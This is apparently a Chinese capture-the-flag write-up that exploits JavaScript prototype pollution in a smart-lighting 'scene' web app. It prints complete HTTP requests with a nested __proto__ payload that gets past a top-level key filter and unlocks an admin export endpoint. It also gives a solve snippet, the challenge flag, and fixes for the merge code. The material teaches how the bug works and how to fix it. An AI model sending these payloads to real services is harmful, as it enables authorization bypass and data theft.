# 灯火的继承者 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / JavaScript 原型链污染（Prototype Pollution） |
| 分值 | 1000 |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:33699`（复现容器） |
| Flag | `HTUCTF{14848f68-3e07-43dc-b507-841f9d29f3ef}` |
| 复现脚本 | `solve_proto.py` |

## 1. 题目解读

题干几乎把漏洞点写在脸上了：

> 场景编排台把每一份偏好写进**同一本册子**……这本册子从不问来者是谁
> —— 它只认一件事，**后来的人可以接过前人的一切**。
> 而你只是路过的访客，手里还没有那把钥匙。可有些东西，从来不需要被授予，
> 只需要**被继承**。

"同一本册子"= 共享的对象原型；"被继承" = 原型链；"不需要被授予" = 不需要真的拿到权限，
往原型上写属性即可。

## 2. 接口枚举

首页直接列出了全部路由，`GET /api/help` 也有：

```json
{
  "name": "HTU 智能灯控 · 场景编排台",
  "routes": {
    "GET /": "场景编排台页面",
    "POST /api/scene": "提交场景配置（JSON）",
    "GET /api/scene": "查看当前场景与继承探针",
    "GET /api/admin/export": "导出审核数据，需运维权限"
  }
}
```

## 2. Burp 复现（完整请求报文）

> 换容器时只改 `Host`。全程用 **Repeater** 即可：
> 浏览器访问首页 → Burp **Proxy → HTTP history** 抓到任意一条本站请求 →
> 右键 **Send to Repeater**，之后直接改方法、路径和 body。

### 2.1 摸基线

```http
GET /api/scene HTTP/1.1
Host: 103.163.47.230:33699
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

Response：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":true,"scene":{"livingRoom":{"brightness":80,"mode":"warm"},"study":{"brightness":60,"mode":"cool"}},"inheritanceProbe":{"isOperator":null,"canExport":null}}
```

`inheritanceProbe` 是**污染结果的指示灯**：`isOperator` / `canExport` 从 `null` 变 `true` 就说明污染成功。

再试导出接口：

```http
GET /api/admin/export HTTP/1.1
Host: 103.163.47.230:33699
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"ok":false,"message":"导出需要运维权限","inheritanceProbe":{"isOperator":null,"canExport":null}}
```

目标明确：**让 `inheritanceProbe.isOperator` 和 `canExport` 变成真值**。

## 3. 第一层：顶层的 `__proto__` 被拦

Repeater 里把方法改成 `POST`、body 换成下面这段：

```http
POST /api/scene HTTP/1.1
Host: 103.163.47.230:33699
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Content-Type: application/json
Content-Length: 54
Connection: close

{"__proto__":{"isOperator":true,"canExport":true}}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":false,"message":"配置包含保留字段，已拒绝"}
```

服务端有"保留字段"检查——但**只检查了最外层对象的键**。

## 4. 第二层：把 `__proto__` 嵌套一层递进去

配置合并是**递归**的（"把每一份偏好写进同一本册子"）。顶层键会被过滤，
就把恶意键藏进子对象里，让递归合并时去触碰它：

```http
POST /api/scene HTTP/1.1
Host: 103.163.47.230:33699
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Content-Type: application/json
Content-Length: 65
Connection: close

{"livingRoom":{"__proto__":{"isOperator":true,"canExport":true}}}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":true,"accepted":["livingRoom"],"scene":{...},"inheritanceProbe":{"isOperator":true,"canExport":true}}
```

`inheritanceProbe` 立刻变成 `true` —— 污染成功。

> ⚠️ **Burp 里不会踩的坑，脚本里会踩**：`__proto__` 在 **JS 对象字面量**里会被当成
> "设置原型"，`JSON.stringify` 后直接消失（变 `{}`）。用 Burp 手写 JSON 文本没有这个问题；
> 用 `curl -d` 或 `fetch` 时则必须让它作为**字符串键**存在（`JSON.parse('{"__proto__":{...}}')`）。

## 5. 取走审核记录

沿用第 2.1 节那条 `GET /api/admin/export`，原样再发一次：

```http
GET /api/admin/export HTTP/1.1
Host: 103.163.47.230:33699
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":true,"flag":"HTUCTF{14848f68-3e07-43dc-b507-841f9d29f3ef}"}
```

> 注意：污染的是**进程内的 `Object.prototype`**，所以这个请求不需要带任何 Cookie，
> 换一个浏览器/新会话同样有效。

## 6. 脚本等价物

`solve_proto.py` 发的就是上面这三个请求，仅作批量复现用：

```python
req("/api/scene", {"__proto__": {"isOperator": True, "canExport": True}}, "POST")            # 被拒
req("/api/scene", {"livingRoom": {"__proto__": {"isOperator": True, "canExport": True}}}, "POST")  # 成功
req("/api/admin/export")   # -> flag
```

## 7. 知识点：原型链污染是怎么发生的

服务端大概是这样的递归合并（lodash `_.merge` / `merge-deep` / 手写 `deepMerge` 都一样）：

```js
function merge(target, source) {           // 递归合并用户配置进"场景库"
  for (const key in source) {
    if (typeof source[key] === "object") {
      merge(target[key] ??= {}, source[key]);   // ← 递归时会取 target["livingRoom"]
    } else {
      target[key] = source[key];
    }
  }
}
```

关键在于 `for...in` / 赋值这条链上，`__proto__` 是 `Object.prototype` 上的 **setter**：

```js
const o = {};
o["__proto__"] = { isOperator: true };   // 等价于 Object.setPrototypeOf(o, {...})
({}).isOperator                          // undefined —— 但污染的是合并目标，不是 o
```

当递归走到 `target["livingRoom"]["__proto__"] = {...}` 时，写的是 `livingRoom` 这个对象的原型，
也就是 `Object.prototype`（`livingRoom` 是普通对象字面量）。于是**进程内所有普通对象**都凭空多出
`isOperator: true` / `canExport: true` 两个属性 —— 鉴权代码里那个没被显式赋值的
`req.user.isOperator`，从 `undefined` 摇身一变成了 `true`。

典型判权代码长这样：

```js
if (scene.isOperator && scene.canExport) { return exportAuditLog(); }   // 绕过
```

历史上真实的中招案例：lodash `_.merge`（CVE-2018-3721 / CVE-2020-8203）、
`dot-prop`、`deep-extend`、`hoek`、`jQuery.extend` 等。

**为什么"只检查顶层"没用**：黑名单写在入口处，而污染发生在递归的每一层。
只要在任意嵌套深度上出现 `__proto__`（或 `constructor.prototype`）都会生效。

## 8. 修复建议

```js
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;  // 递归的每一层都要拦
    if (isPlainObject(source[key])) safeMerge(target[key] ??= {}, source[key]);
    else target[key] = source[key];
  }
}
```

- 递归合并的**每一层**都过滤 `__proto__` / `constructor` / `prototype`
- 用 `Object.create(null)` 作为合并目标（无原型，也就无法污染）
- `JSON.parse(text, reviver)` 里直接剔除危险键，在反序列化入口一次性解决
- 用 `Object.prototype.hasOwnProperty.call(obj, k)` 判权，别依赖 `obj.someFlag` 是否为真值
- 升级 lodash ≥ 4.17.21 等已修复版本；`Object.freeze(Object.prototype)` 也是兜底手段
